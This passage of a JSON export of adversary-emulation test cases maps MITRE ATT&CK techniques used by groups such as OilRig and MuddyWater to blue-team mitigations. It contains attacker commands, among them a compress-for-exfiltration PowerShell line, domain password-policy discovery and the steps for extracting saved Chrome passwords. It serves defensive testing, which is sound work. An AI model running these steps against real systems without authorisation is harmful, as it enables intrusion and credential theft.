the rights to schedule a priority process. This can be can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Increase scheduling priority.\n---\nConfigure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl</code>. The setting can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled.\n---\nLimit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":[],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--35dd844a-b219-4e2b-a6bb-efa9a75995a9","relationship--a1e16836-d6d9-4d47-bb9a-35f31f369980","relationship--91e941a6-64bd-42ab-94f9-aa0e90f132ff","course-of-action--f2cb6ce2-188d-4162-8feb-594f949b13dd","relationship--9d4e8b44-90f8-4a10-8419-8187d4babf24","course-of-action--cc2399fd-3cd3-4319-8d0a-fbd6420cdaf8","relationship--8f09085f-c1cf-4321-89c4-17d93e774f6f","course-of-action--9bb9e696-bff8-4ae1-9454-961fc7d91d5f","relationship--63c9cdd8-0e64-46dd-9459-3d64828b0cc7","course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3","relationship--1d50b715-96a2-4fd6-bf92-603ad90730fd","course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Beechey, J. (2010, December). Application Whitelisting: Panacea or Propaganda?. Retrieved November 18, 2014. http://www.sans.org/reading-room/whitepapers/application/application-whitelisting-panacea-propaganda-33599","Bromiley, M., et al.. (2019, July 18). Hard Pass: Declining APT34’s Invite to Join Their Professional Network. Retrieved August 26, 2019. https://www.fireeye.com/blog/threat-research/2019/07/hard-pass-declining-apt34-invite-to-join-their-professional-network.html","Corio, C., & Sayana, D. P. (2008, June). Application Lockdown with Software Restriction Policies. Retrieved November 18, 2014. http://technet.microsoft.com/en-us/magazine/2008.06.srp.aspx","Lee, B., Falcone, R. (2018, February 23). OopsIE! OilRig Uses ThreeDollars to Deliver New Trojan. Retrieved July 16, 2018. https://researchcenter.paloaltonetworks.com/2018/02/unit42-oopsie-oilrig-uses-threedollars-deliver-new-trojan/","Lee, B., Falcone, R. (2018, July 25). OilRig Targets Technology Service Provider and Government Agency with QUADAGENT. Retrieved August 9, 2018. https://researchcenter.paloaltonetworks.com/2018/07/unit42-oilrig-targets-technology-service-provider-government-agency-quadagent/","Loobeek, L. (2017, December 8). leoloobeek Status. Retrieved December 12, 2017. https://twitter.com/leoloobeek/status/939248813465853953","Microsoft. (2005, January 21). Task Scheduler and security. Retrieved June 8, 2016. https://technet.microsoft.com/en-us/library/cc785125.aspx","Microsoft. (2012, June 27). Using Software Restriction Policies and AppLocker Policies. Retrieved April 7, 2016. https://technet.microsoft.com/en-us/library/ee791851.aspx","Microsoft. (2012, November 15). Domain controller: Allow server operators to schedule tasks. Retrieved December 18, 2017. https://technet.microsoft.com/library/jj852168.aspx","Microsoft. (2013, May 8). Increase scheduling priority. Retrieved December 18, 2017. https://technet.microsoft.com/library/dn221960.aspx","Microsoft. (2017, May 28). Audit Other Object Access Events. Retrieved June 27, 2019. https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events","Microsoft. (n.d.). General Task Registration. Retrieved December 12, 2017. https://technet.microsoft.com/library/dd315590.aspx","NSA Information Assurance Directorate. (2014, August). Application Whitelisting Using Microsoft AppLocker. Retrieved March 31, 2016. https://www.iad.gov/iad/library/ia-guidance/tech-briefs/application-whitelisting-using-microsoft-applocker.cfm","PowerSploit. (n.d.). Retrieved December 4, 2014. https://github.com/mattifestation/PowerSploit","Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016. https://technet.microsoft.com/en-us/sysinternals/bb963902","Satyajit321. (2015, November 3). Scheduled Tasks History Retention settings. Retrieved December 12, 2017. https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen","Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016. http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html"],"mitreId":"T1053"},"blueTeam":{"successfulDetectionBehaviors":["Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create scheduled tasks on remote systems. Toolkits like the PowerSploit framework contain PowerUp modules that can be used to explore systems for permission weaknesses in scheduled tasks that could be used to escalate privileges. (Citation: Powersploit)\n\nConfigure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM. The associated Registry key is located at <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SubmitControl</code>. The setting can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > Security Options: Domain Controller: Allow server operators to schedule tasks, set to disabled. (Citation: TechNet Server Operator Scheduled Task)\n\nConfigure the Increase Scheduling Priority option to only allow the Administrators group the rights to schedule a priority process. This can be can be configured through GPO: Computer Configuration > [Policies] > Windows Settings > Security Settings > Local Policies > User Rights Assignment: Increase scheduling priority. (Citation: TechNet Scheduling Priority)\n\nIdentify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)","Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.","Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.","Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.","Manage the creation, modification, use, and permissions associated to user accounts."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--329d13b9-5a93-4d5d-ad48-a91e0e70d133","vectrId":"329d13b9-5a93-4d5d-ad48-a91e0e70d133","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"329d13b9-5a93-4d5d-ad48-a91e0e70d133","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"System Information Discovery","variant":"Magic Hound - System Information Discovery - Pupy","objective":"An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\n### Windows\n\nExample commands and utilities that obtain this information include <code>ver</code>, [Systeminfo](https://attack.mitre.org/software/S0096), and <code>dir</code> within [cmd](https://attack.mitre.org/software/S0106) for identifying information based on present files and directories.\n\n### Mac\n\nOn Mac, the <code>systemsetup</code> command gives a detailed breakdown of the system, but it requires administrative privileges. Additionally, the <code>system_profiler</code> gives a very detailed breakdown of configurations, firewall rules, mounted volumes, hardware, and many other things without needing elevated permissions.\n\n### AWS\n\nIn Amazon Web Services (AWS), the Application Discovery Service may be used by an adversary to identify servers, virtual machines, software, and software dependencies running.(Citation: Amazon System Discovery)\n\n### GCP\n\nOn Google Cloud Platform (GCP) <code>GET /v1beta1/{parent=organizations/*}/assets</code> or <code>POST /v1beta1/{parent=organizations/*}/assets:runDiscovery</code> may be used to list an organizations cloud assets, or perform asset discovery on a cloud environment.(Citation: Google Command Center Dashboard)\n\n### Azure\n\nIn Azure, the API request <code>GET https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Compute/virtualMachines/{vmName}?api-version=2019-03-01</code> may be used to retrieve information about the model or instance view of a virtual machine.(Citation: Microsoft Virutal Machine API)\n---\n[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine. Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server.[Pupy](https://attack.mitre.org/software/S0192) can grab a system’s information including the OS version, architecture, etc.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["5a7984d4-d134-4fbd-ab45-5dfa73bfd16b"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1","relationship--b60dcc78-83b0-4fe2-b874-6f22f99b6087","relationship--c28d6f10-431f-493c-8abd-918240c5c970","course-of-action--c620e3a1-fff5-424f-abea-d2b0f3616f67","tool--cb69b20d-56d0-41ab-8440-4a4b251614d4","relationship--7e2a1dfa-1ccd-4700-a4a5-3b98590ae710","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Amazon. (n.d.). What Is AWS Application Discovery Service?. Retrieved October 8, 2019. https://docs.aws.amazon.com/en_pv/application-discovery/latest/userguide/what-is-appdiscovery.html","Google. (2019, October 3). Quickstart: Using the dashboard. Retrieved October 8, 2019. https://cloud.google.com/security-command-center/docs/quickstart-scc-dashboard","Lee, B. and Falcone, R. (2017, February 15). Magic Hound Campaign Attacks Saudi Targets. Retrieved December 27, 2017. https://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/","Microsoft. (2019, March 1). Virtual Machines - Get. Retrieved October 8, 2019. https://docs.microsoft.com/en-us/rest/api/compute/virtualmachines/get","Nicolas Verdier. (n.d.). Retrieved January 29, 2018. https://github.com/n1nj4sec/pupy"],"mitreId":"T1082"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--3705db78-0dd2-4696-abb0-4047dff98d0d","vectrId":"3705db78-0dd2-4696-abb0-4047dff98d0d","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"3705db78-0dd2-4696-abb0-4047dff98d0d","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"File and Directory Discovery","variant":"Magic Hound - File and Directory Discovery - Pupy","objective":"Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\n### Windows\n\nExample utilities used to obtain this information are <code>dir</code> and <code>tree</code>. (Citation: Windows Commands JPCERT) Custom tools may also be used to gather file and directory information and interact with the Windows API.\n\n### Mac and Linux\n\nIn Mac and Linux, this kind of discovery is accomplished with the <code>ls</code>, <code>find</code>, and <code>locate</code> commands.\n---\n[Pupy](https://attack.mitre.org/software/S0192) is an open source, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool. (Citation: GitHub Pupy) It is written in Python and can be generated as a payload in several different ways (Windows exe, Python file, PowerShell oneliner/file, Linux elf, APK, Rubber Ducky, etc.). (Citation: GitHub Pupy) [Pupy](https://attack.mitre.org/software/S0192) is publicly available on GitHub. (Citation: GitHub Pupy)","command":"[Magic Hound](https://attack.mitre.org/groups/G0059) malware can list a victim's logical drives and the type, as well the total/free space of the fixed devices. Other malware can list a directory's contents.[Pupy](https://attack.mitre.org/software/S0192) can walk through directories and recursively search for strings in files.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["5a7984d4-d134-4fbd-ab45-5dfa73bfd16b"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--7bc57495-ea59-4380-be31-a64af124ef18","relationship--87b8b451-bf9b-4e93-b591-05ef502970f5","relationship--e432b3bc-5539-40e5-bce2-3ba6f463b571","course-of-action--2ace01f8-67c8-43eb-b7b1-a7b9f1fe67e1","tool--cb69b20d-56d0-41ab-8440-4a4b251614d4","relationship--75d124da-bb01-422f-bbf1-a472c841741b","intrusion-set--f9d6633a-55e6-4adc-9263-6ae080421a13"]}],"references":["Lee, B. and Falcone, R. (2017, February 15). Magic Hound Campaign Attacks Saudi Targets. Retrieved December 27, 2017. https://researchcenter.paloaltonetworks.com/2017/02/unit42-magic-hound-campaign-attacks-saudi-targets/","Nicolas Verdier. (n.d.). Retrieved January 29, 2018. https://github.com/n1nj4sec/pupy","Tomonaga, S. (2016, January 26). Windows Commands Abused by Attackers. Retrieved February 2, 2016. http://blog.jpcert.or.jp/2016/01/windows-commands-abused-by-attackers.html"],"mitreId":"T1083"},"blueTeam":{"successfulDetectionBehaviors":["File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--38a95266-6cda-4905-a5e7-96531e80619f","vectrId":"38a95266-6cda-4905-a5e7-96531e80619f","name":"0","offset":0,"createTime":1.578424535289E12,"updateTime":1.578425557291E12,"phaseId":"bb51fb2c-dc2f-40dc-9e1b-f3f33f7d5675","templateId":"38a95266-6cda-4905-a5e7-96531e80619f","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":"","trueAttackEndTimelineId":"","status":"NotPerformed","method":"Data Compressed","variant":"Compress Data for Exfiltration With PowerShell","objective":"An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration \n","command":"dir <directory> -Recurse | Compress-Archive -DestinationPath <dest.zip>","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["bc5080df-ad46-8c5a-9f23-12f61d2ec5e6"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_id","value":"attack-pattern--b9f5dbe2-4c55-4fc5-af2e-d42c1d182ec4"}],"references":[],"mitreId":"T1002"},"blueTeam":{"successfulDetectionBehaviors":[],"expectedDetectionLayerIds":["54c70ef6-1e4a-4613-a99d-692230cb557a","765c22af-e010-4b4d-9ba5-86e1ae6c916d"],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":"","alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":["Audit command line and PowerShell logs to identify common compression tool usage and compare to baseline user behaviors"]},"evidenceFiles":[],"organizationIds":["1cf413ba-326a-4d18-979c-367eb1306f69"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--3988cd09-03b3-4736-8783-45262752f8d9","vectrId":"3988cd09-03b3-4736-8783-45262752f8d9","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"3988cd09-03b3-4736-8783-45262752f8d9","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"System Network Connections Discovery","variant":"OilRig - System Network Connections Discovery - netstat - Net","objective":"Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. \n\nAn adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview)\n\n### Windows\n\nUtilities and commands that acquire this information include [netstat](https://attack.mitre.org/software/S0104), \"net use,\" and \"net session\" with [Net](https://attack.mitre.org/software/S0039).\n\n### Mac and Linux \n\nIn Mac and Linux, <code>netstat</code> and <code>lsof</code> can be used to list current connections. <code>who -a</code> and <code>w</code> can be used to show which users are currently logged in, similar to \"net session\".\n---\n[netstat](https://attack.mitre.org/software/S0104) is an operating system utility that displays active TCP connections, listening ports, and network statistics. (Citation: TechNet Netstat)\n---\nThe [Net](https://attack.mitre.org/software/S0039) utility is a component of the Windows operating system. It is used in command-line operations for control of users, groups, services, and network connections. (Citation: Microsoft Net Utility)\n\n[Net](https://attack.mitre.org/software/S0039) has a great deal of functionality, (Citation: Savill 1999) much of which is useful for an adversary, such as gathering system and network information for Discovery, moving laterally through [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) using <code>net use</code> commands, and interacting with services. The net1.exe utility is executed for certain functionality when net.exe is run and can be used directly in commands such as <code>net1 user</code>.","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used <code>netstat -an</code> on a victim to get a listing of network connections.[netstat](https://attack.mitre.org/software/S0104) can be used to enumerate local network connections, including active TCP connections and other network statistics.\n---\nCommands such as <code>net use</code> and <code>net session</code> can be used in [Net](https://attack.mitre.org/software/S0039) to gather information about network connections from a particular host.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["c8e8396d-7c77-4119-bd6d-5d88419032ea","b908f5c3-a12f-4e3f-b46e-6aa8a0b1aee3"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--7e150503-88e7-4861-866b-ff1ac82c4475","relationship--8edb0383-cae8-43ee-9241-b25e5068cc95","relationship--b6f00052-49e3-48c5-8f5e-492be4e67acf","course-of-action--c1676218-c16a-41c9-8f7a-023779916e39","tool--4664b683-f578-434f-919b-1c1aad2a1111","relationship--28189361-4cd2-4925-a095-d7ebd07ebd57","tool--03342581-f790-4f03-ba41-e82e67392e23","relationship--4c94f67d-6662-44ea-be75-ded8b2dbfa00","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Amazon. (n.d.). What Is Amazon VPC?. Retrieved October 6, 2019. https://docs.aws.amazon.com/vpc/latest/userguide/what-is-amazon-vpc.html","Annamalai, N., Casey, C., Almeida, M., et. al.. (2019, June 18). What is Azure Virtual Network?. Retrieved October 6, 2019. https://docs.microsoft.com/en-us/azure/virtual-network/virtual-networks-overview","Falcone, R. and Lee, B.. (2016, May 26). The OilRig Campaign: Attacks on Saudi Arabian Organizations Deliver Helminth Backdoor. Retrieved May 3, 2017. http://researchcenter.paloaltonetworks.com/2016/05/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/","Google. (2019, September 23). Virtual Private Cloud (VPC) network overview. Retrieved October 6, 2019. https://cloud.google.com/vpc/docs/vpc","Microsoft. (2006, October 18). Net.exe Utility. Retrieved September 22, 2015. https://msdn.microsoft.com/en-us/library/aa939914","Microsoft. (n.d.). Netstat. Retrieved April 17, 2016. https://technet.microsoft.com/en-us/library/bb490947.aspx","Savill, J. (1999, March 4). Net.exe reference. Retrieved September 22, 2015. http://windowsitpro.com/windows/netexe-reference"],"mitreId":"T1049"},"blueTeam":{"successfulDetectionBehaviors":["Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about network connections, and audit and/or block them by using whitelisting (Citation: Beechey 2010) tools, like AppLocker, (Citation: Windows Commands JPCERT) (Citation: NSA MS AppLocker) or Software Restriction Policies (Citation: Corio 2008) where appropriate. (Citation: TechNet Applocker vs SRP)"],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--39d21839-f414-490f-8127-4821bfdd63c0","vectrId":"39d21839-f414-490f-8127-4821bfdd63c0","name":null,"offset":0,"createTime":1.578492474485E12,"updateTime":1.578492474485E12,"phaseId":"549e7bc3-0b2b-46bc-a6d7-81bf0679c1b3","templateId":"39d21839-f414-490f-8127-4821bfdd63c0","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Password Policy Discovery","variant":"OilRig - Password Policy Discovery - Net","objective":"Password policies for networks are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). An adversary may attempt to access detailed information about the password policy used within an enterprise network. This would help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts).\n\nPassword policies can be set and discovered on Windows, Linux, and macOS systems. (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies)\n\n### Windows\n* <code>net accounts</code>\n* <code>net accounts /domain</code>\n\n### Linux\n* <code>chage -l <username></code>\n* <code>cat /etc/pam.d/common-password</code>\n\n### macOS\n* <code>pwpolicy getaccountpolicies</code>\n---\nThe [Net](https://attack.mitre.org/software/S0039) utility is a component of the Windows operating system. It is used in command-line operations for control of users, groups, services, and network connections. (Citation: Microsoft Net Utility)\n\n[Net](https://attack.mitre.org/software/S0039) has a great deal of functionality, (Citation: Savill 1999) much of which is useful for an adversary, such as gathering system and network information for Discovery, moving laterally through [Windows Admin Shares](https://attack.mitre.org/techniques/T1077) using <code>net use</code> commands, and interacting with services. The net1.exe utility is executed for certain functionality when net.exe is run and can be used directly in commands such as <code>net1 user</code>.","command":"[OilRig](https://attack.mitre.org/groups/G0049) has used net.exe in a script with <code>net accounts /domain</code> to find the password policy of a domain.Ensure only valid password filters are registered. Filter DLLs must be present in Windows installation directory (<code>C:\\Windows\\System32\\</code> by default) of a domain controller and/or local computer with a corresponding entry in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Notification Packages</code>.\n---\nThe <code>net accounts</code> and <code>net accounts /domain</code> commands with [Net](https://attack.mitre.org/software/S0039) can be used to obtain password policy information.","likelihood":null,"risk":null,"internalExternal":null,"stealth":null,"attackVector":null,"attackComplexity":null,"privilegesRequired":null,"redTeamProductIds":["b908f5c3-a12f-4e3f-b46e-6aa8a0b1aee3"],"targetAssets":[],"sourceIps":[],"capecId":null,"metadata":[{"key":"stix_templates","value":["attack-pattern--b6075259-dba3-44e9-87c7-e954f37ec0d5","relationship--5e39caf2-083b-4e4c-b04f-d83c512341cb","relationship--fe15ff1c-7a12-4bcf-aa93-68deb475e6f0","course-of-action--49961e75-b493-423a-9ec7-ac2d6f55384a","relationship--e2748683-077b-4e91-9225-6b29245fdafc","course-of-action--90c218c3-fbf8-4830-98a7-e8cfb7eaa485","tool--03342581-f790-4f03-ba41-e82e67392e23","relationship--0224ebf5-13ef-4fb0-b9e7-53ea58c15a4d","intrusion-set--4ca1929c-7d64-4aab-b849-badbfc0c760d"]}],"references":["Holland, J. (2016, January 25). User password policies on non AD machines. Retrieved April 5, 2018. https://www.jamf.com/jamf-nation/discussions/18574/user-password-policies-on-non-ad-machines","Matutiae, M. (2014, August 6). How to display password policy information for a user (Ubuntu)?. Retrieved April 5, 2018. https://superuser.com/questions/150675/how-to-display-password-policy-information-for-a-user-ubuntu","Microsoft. (2006, October 18). Net.exe Utility. Retrieved September 22, 2015. https://msdn.microsoft.com/en-us/library/aa939914","Microsoft. (n.d.). Installing and Registering a Password Filter DLL. Retrieved November 21, 2017. https://msdn.microsoft.com/library/windows/desktop/ms721766.aspx","Savill, J. (1999, March 4). Net.exe reference. Retrieved September 22, 2015. http://windowsitpro.com/windows/netexe-reference","Singh, S., Yin, H. (2016, May 22). https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.html. Retrieved April 5, 2018. https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.html"],"mitreId":"T1201"},"blueTeam":{"successfulDetectionBehaviors":["Mitigating discovery of password policies is not advised since the information is required to be known by systems and users of a network. Ensure password policies are such that they mitigate brute force attacks yet will not give an adversary an information advantage because the policies are too light. Active Directory is a common way to set and enforce password policies throughout an enterprise network. (Citation: Microsoft Password Complexity)","Set and enforce secure password policies for accounts."],"expectedDetectionLayerIds":[],"blueTeamProductIds":[],"outcomeNotes":null,"trueDetectionTimelineId":null,"alertSeverity":"TBD","alertTriggered":"TBD","activityLogged":"TBD","outcomes":["TBD"],"metadata":[],"detections":[]},"evidenceFiles":[],"organizationIds":["92fa723f-7791-467f-8726-05d34d80f40f"],"tagIds":[],"deprecated":false,"deprecationTime":0.0,"automation":{"command":"","executor":"command_prompt","inputArgs":[]},"importTime":null,"importEvent":null,"shareId":"aaca13d1-c4ef-4fd7-87f3-f2a2d6e2fdd8","migrationVersion":"39"},{"type":"x-vectr-io-testcase","id":"x-vectr-io-testcase--3d64be57-aa6c-41d2-9e96-c5ae0ccd3b8b","vectrId":"3d64be57-aa6c-41d2-9e96-c5ae0ccd3b8b","name":null,"offset":0,"createTime":1.574779748235E12,"updateTime":1.574779748235E12,"phaseId":"01d77cc8-b129-413b-adf5-850cebc4ae79","templateId":"3d64be57-aa6c-41d2-9e96-c5ae0ccd3b8b","icon":"icons/target.svg","redTeam":{"trueAttackStartTimelineId":null,"trueAttackEndTimelineId":null,"status":"NotPerformed","method":"Credentials from Web Browsers","variant":"MuddyWater - Credentials from Web Browsers - LaZagne","objective":"Adversaries may acquire credentials from web browsers by reading files specific to the target browser.  (Citation: Talos Olympic Destroyer 2018) \n\nWeb browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\n\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, <code>AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data</code> and executing a SQL query: <code>SELECT action_url, username_value, password_value FROM logins;</code>. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function <code>CryptUnprotectData</code>, which uses the victim’s cached logon credentials as the decryption key. (Citation: Microsoft CryptUnprotectData ‎April 2018)\n \nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. (Citation: Proofpoint Vega Credential Stealer May 2018)(Citation: FireEye HawkEye Malware July 2017)\n\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.(Citation: GitHub Mimikittenz July 